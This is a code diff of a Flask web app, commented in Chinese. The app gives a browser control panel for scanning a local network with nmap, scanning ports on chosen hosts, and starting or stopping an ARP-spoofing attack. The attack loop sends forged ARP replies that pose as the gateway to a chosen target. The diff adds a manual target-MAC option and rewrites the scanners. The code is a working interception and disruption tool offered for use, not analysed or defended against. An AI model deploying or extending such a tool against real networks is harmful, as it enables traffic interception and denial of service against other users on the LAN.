@@ -5,9 +5,9 @@ import threading
 import socket
 from scapy.all import *
 import time
-from concurrent.futures import ThreadPoolExecutor
 import logging
 import ipaddress
+import nmap
 
 app = Flask(__name__)
 
@@ -48,12 +48,6 @@ logging.basicConfig(
 )
 
 
-# 加载配置文件
-def load_config():
-    with open('config.json', 'r') as f:
-        return json.load(f)
-
-
 # 获取本机 MAC 地址
 def get_local_mac(interface):
     return get_if_hwaddr(interface)
@@ -77,156 +71,107 @@ def get_default_interface():
 
 # 运行 ARP 欺骗的函数
 def arp_spoof(target_ip, target_mac, gateway_ip, local_mac, interface):
+    """
+    利用 Scapy 不断发送伪造的 ARP 回复给目标，从而执行 ARP 欺骗
+    """
     global arp_spoofing_active
 
     # 构建带有以太网帧的 ARP 响应包
     arp_response = (
-            Ether(src=local_mac, dst=target_mac) /  # 指定源和目标的 MAC 地址
-            ARP(
-                op=2,  # ARP 回复
-                psrc=gateway_ip,  # 伪装的源 IP 地址（网关）
-                pdst=target_ip,  # 目标设备的 IP 地址
-                hwsrc=local_mac,  # 本机 MAC 地址
-                hwdst=target_mac  # 目标设备的 MAC 地址
-            )
+        Ether(src=local_mac, dst=target_mac) /
+        ARP(
+            op=2,            # ARP 回复
+            psrc=gateway_ip, # 伪装的网关 IP
+            pdst=target_ip,  # 目标设备的 IP
+            hwsrc=local_mac, # 本机 MAC
+            hwdst=target_mac # 目标设备 MAC
+        )
     )
 
     while arp_spoofing_active:
-        start_time = time.time()  # 记录开始时间
-
         # 发送伪造的 ARP 响应包
         sendp(arp_response, iface=interface, verbose=False)
-        # logging.info("Spoofing ARP response")
         # time.sleep(2)
-        # elapsed_time = time.time() - start_time
-        # logging.info(f"Time elapsed since start: {elapsed_time:.4f} seconds")
 
 
-# 单个 IP 的扫描任务
-def scan_ip(ip):
-    arp_request = ARP(pdst=ip)
-    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
-    packet = ether / arp_request
-
-    try:
-        # 发送请求并等待回复
-        response = srp1(packet, timeout=1, verbose=0)
-        if response:
-            mac = response.hwsrc
-            try:
-                hostname = socket.gethostbyaddr(ip)[0]
-            except socket.herror:
-                hostname = "Unknown"
-            return {'ip': ip, 'mac': mac, 'hostname': hostname}
-    except Exception as e:
-        logging.info(f"Error scanning IP {ip}: {e}")
-
-    return None
-
-
-# 多线程扫描网络设备
+# 使用 Nmap 扫描网络设备
 def scan_network(network):
+    """
+    使用 Nmap 来扫描局域网内所有存活主机（Ping 扫描），
+    并收集其 IP、MAC 和主机名信息。
+    """
+    logging.info(f"开始使用 Nmap 扫描网络: {network}")
+    start_time = time.time()
 
-    start_time = time.time()  # 记录开始时间
-    logging.info(f"Network scan is in {network} .")
-    # 提取网络 IP 前缀
-    ip_prefix = network.rsplit('.', 1)[0]
-    ip_range = [f"{ip_prefix}.{i}" for i in range(1, 255)]  # 生成 IP 地址范围
-
+    nm = nmap.PortScanner()
     devices = []
-    with ThreadPoolExecutor(max_workers=1000) as executor:
-        results = executor.map(scan_ip, ip_range)
-        devices = [result for result in results if result is not None]
 
-    end_time = time.time()  # 记录结束时间
-    elapsed_time = end_time - start_time  # 计算扫描用时
-    logging.info(f"Network scan completed in {elapsed_time:.2f} seconds.")  # 打印用时
-    # logging.info(f"devices: {devices} .")
-
-    return devices
-
-
-scan_progress = 0
-scan_total_ports = 65535
-scan_lock = threading.Lock()
-
-
-def get_hostname(ip):
-    """
-    获取 IP 对应的主机名
-    """
     try:
-        hostname = socket.gethostbyaddr(ip)[0]  # 通过 DNS 反向解析
-    except socket.herror:
-        hostname = None  # 如果解析失败，返回 None
-    return hostname
-
-
-def scan_network_with_arp(network):
-    """
-    使用批量 ARP 请求扫描网络，并尝试获取主机名
-    """
-    start_time = time.time()  # 记录开始时间
-
-    devices = []
-    network1 = ipaddress.ip_network(network, strict=False)
-
-    # 构造 ARP 广播包
-    arp_pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=str(network1))
-    results, _ = srp(arp_pkt, timeout=1, verbose=0)  # 批量发送 ARP 请求
-
-    for _, recv_pkt in results:
-        ip = recv_pkt.psrc  # 获取 IP 地址
-        mac = recv_pkt.hwsrc  # 获取 MAC 地址
-
-        # 尝试解析主机名
-        hostname = get_hostname(ip)
-
-        # 打印发现的信息
-        print(f"Active: {ip}, MAC: {mac}, Hostname: {hostname}")
-
-        # 保存到设备列表
-        devices.append({
-            'ip': ip,
-            'mac': mac,
-            'hostname': hostname
-        })
-    end_time = time.time()  # 记录结束时间
-    elapsed_time = end_time - start_time  # 计算扫描用时
-    logging.info(f"Network scan completed in {elapsed_time:.2f} seconds.")  # 打印用时
-    return devices
-
-
-# 单个端口扫描任务
-def scan_port(ip, port):
-    global scan_progress
-    try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.settimeout(1)
-        result = sock.connect_ex((ip, port))
-        sock.close()
-
-        # 更新进度
-        with scan_lock:
-            scan_progress += 1
-
-        return port if result == 0 else None
+        # -sn 表示只进行主机发现（Ping 扫描），-T4 提高扫描速度
+        nm.scan(hosts=network, arguments='-sn -T4')
     except Exception as e:
-        logging.info(f"Error scanning port {port} on {ip}: {e}")
-        return None
+        logging.error(f"扫描网络时出错: {e}")
+        return devices
+
+    # 逐个处理扫描结果
+    for host in nm.all_hosts():
+        if nm[host].state() == 'up':
+            # 获取 MAC，如果没有则返回 'Unknown'
+            mac = nm[host]['addresses'].get('mac', 'Unknown')
+            # 获取主机名，如果没有则返回 'Unknown'
+            hostname = nm[host].hostname() or 'Unknown'
+            devices.append({
+                'ip': host,
+                'mac': mac,
+                'hostname': hostname
+            })
+            logging.info(f"发现设备: IP={host}, MAC={mac}, Hostname={hostname}")
+
+    end_time = time.time()
+    elapsed_time = end_time - start_time
+    logging.info(f"Nmap 网络扫描完成，用时 {elapsed_time:.2f} 秒。")
+
+    return devices
 
 
-# 扫描指定 IP 的端口
+# 使用 Nmap 扫描指定 IP 的端口
 def scan_ports(ip, start_port=1, end_port=65535):
+    """
+    使用 Nmap 对指定 IP 进行端口扫描，返回开放的端口列表。
+    """
+    logging.info(f"开始使用 Nmap 扫描 {ip} 的端口范围: {start_port}-{end_port}")
+    start_time = time.time()
+
+    nm = nmap.PortScanner()
     open_ports = []
-    with ThreadPoolExecutor(max_workers=10000) as executor:
-        results = executor.map(lambda port: scan_port(ip, port), range(start_port, end_port + 1))
-        open_ports = [port for port in results if port is not None]
+
+    try:
+        # -T4 提升扫描速度；ports=f'{start_port}-{end_port}' 表示要扫描的端口范围
+        nm.scan(hosts=ip, ports=f'{start_port}-{end_port}', arguments='-T4')
+    except Exception as e:
+        logging.error(f"扫描端口时出错: {e}")
+        return open_ports
+
+    # 解析扫描结果
+    if ip in nm.all_hosts():
+        for proto in nm[ip].all_protocols():
+            # 例如 'tcp', 'udp' 等
+            port_list = nm[ip][proto].keys()
+            for port in port_list:
+                if nm[ip][proto][port]['state'] == 'open':
+                    open_ports.append(port)
+
+    end_time = time.time()
+    elapsed_time = end_time - start_time
+    logging.info(f"Nmap 端口扫描完成，用时 {elapsed_time:.2f} 秒。")
     return open_ports
 
 
 @app.route('/api/scan_ports', methods=['POST'])
 def api_scan_ports():
+    """
+    扫描指定 IP 的所有端口。
+    """
     ip = request.form.get('ip')
     if not ip:
         return jsonify({'error': 'No IP address provided'}), 400
@@ -243,12 +188,18 @@ def api_scan_ports():
 
 @app.route('/')
 def index():
+    """
+    首页渲染，显示扫描页
+    """
     network_prefix = network.rsplit('.', 1)[0] + '.'
     return render_template('index.html', network_prefix=network_prefix)
 
 
 @app.route('/control', methods=['POST'])
 def control():
+    """
+    控制 ARP 欺骗的启动与停止
+    """
     global arp_spoofing_thread, arp_spoofing_active
     action = request.form.get('action')
 
@@ -264,48 +215,47 @@ def control():
         # 拼接完整的目标 IP 地址
         target_ip = f"{network.rsplit('.', 1)[0]}.{target_ip_suffix}"
 
+        # 获取用户输入的目标 MAC 地址（可以为空）
+        user_mac = request.form.get('target_mac')
+
         # 获取默认网卡和本机 MAC 地址
         interface = get_default_interface()
         local_mac = get_local_mac(interface)
-        target_mac = get_mac(target_ip)
+
+        # 如果未提供目标 MAC 地址，则尝试自动获取
+        target_mac = user_mac if user_mac else get_mac(target_ip)
         if not target_mac:
-            return 'Unable to obtain target MAC address. Please check the IP address.'
+            return 'Unable to obtain target MAC address. Please check the IP address or manually specify a MAC address.'
 
         # 启动 ARP 欺骗线程
         arp_spoofing_active = True
-        arp_spoofing_thread = threading.Thread(target=arp_spoof,
-                                               args=(target_ip, target_mac, gateway_ip, local_mac, interface))
+        arp_spoofing_thread = threading.Thread(
+            target=arp_spoof,
+            args=(target_ip, target_mac, gateway_ip, local_mac, interface)
+        )
         arp_spoofing_thread.start()
-        logging.info(f"started... Target IP: {target_ip}, Target MAC: {target_mac}, Gateway IP: {gateway_ip}")  # 调试日志
+        logging.info(f"ARP Spoofing started... Target IP: {target_ip}, Target MAC: {target_mac}, Gateway IP: {gateway_ip}")
 
         return 'ARP Spoofing started!'
 
     elif action == 'stop':
         arp_spoofing_active = False  # 设置标志为 False，停止 ARP 欺骗线程
         if arp_spoofing_thread and arp_spoofing_thread.is_alive():
-            logging.info(f"stopping...")  # 调试日志
+            logging.info("Stopping ARP spoofing...")
             arp_spoofing_thread.join()  # 等待线程终止
-            logging.info(f"stopped")  # 调试日志
+            logging.info("ARP spoofing stopped.")
 
         return 'ARP Spoofing stopped.'
-
-    return 'Invalid action!'
 
 
 @app.route('/api/devices')
 def api_devices():
-    # 扫描网络设备并返回 JSON 格式数据
+    """
+    扫描网络设备并返回 JSON 格式数据
+    """
     network_devices = scan_network(network)
-    # network_devices = scan_network_with_arp(network)
     return jsonify(network_devices)
 
-
-# 新增：获取扫描进度的 API
-@app.route('/api/scan_progress')
-def scan_progress_status():
-    with scan_lock:
-        progress = int((scan_progress / scan_total_ports) * 100)
-    return jsonify({'progress': progress})
 
 
 if __name__ == '__main__':
